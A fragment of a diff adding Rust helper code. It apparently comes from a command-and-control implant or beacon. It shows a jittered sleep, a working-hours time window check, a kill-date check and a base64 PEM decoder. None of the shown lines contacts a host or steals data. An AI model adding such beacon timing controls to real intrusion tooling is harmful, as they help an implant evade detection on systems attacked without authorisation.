+        js_log!("ln.sample");
+        ln.sample(&mut rand::thread_rng())
+    } else {
+        base
+    };
+    js_log!("sleeping");
+    std::thread::sleep(Duration::from_secs((secs as u64).max(5)));
+    js_log!("awake");
+}
+
+pub(crate) fn in_window(start: &str, end: &str) -> bool {
+    if start.is_empty() || end.is_empty() { return true; }
+    let now      = chrono::Local::now();
+    let now_mins = now.hour() * 60 + now.minute();
+    let parse    = |s: &str| -> Option<u32> {
+        let mut p = s.splitn(2, ':');
+        let h: u32 = p.next()?.parse().ok()?;
+        let m: u32 = p.next()?.parse().ok()?;
+        Some(h * 60 + m)
+    };
+    let (s, e) = match (parse(start), parse(end)) {
+        (Some(s), Some(e)) => (s, e),
+        _ => return true,
+    };
+    if s <= e { now_mins >= s && now_mins < e }
+    else      { now_mins >= s || now_mins < e }
+}
+
+pub(crate) fn kill_date_expired(kill_date: &str) -> bool {
+    if kill_date.is_empty() { return false; }
+    let now = chrono::Local::now();
+    let today = format!("{:04}-{:02}-{:02}", now.year(), now.month(), now.day());
+    today.as_str() >= kill_date
+}
+
+pub(crate) fn decode_pem(b64: &str) -> Option<String> {
+    use base64::{engine::general_purpose::STANDARD as B64, Engine};
+    String::from_utf8(B64.decode(b64.trim()).ok()?).ok()
+}
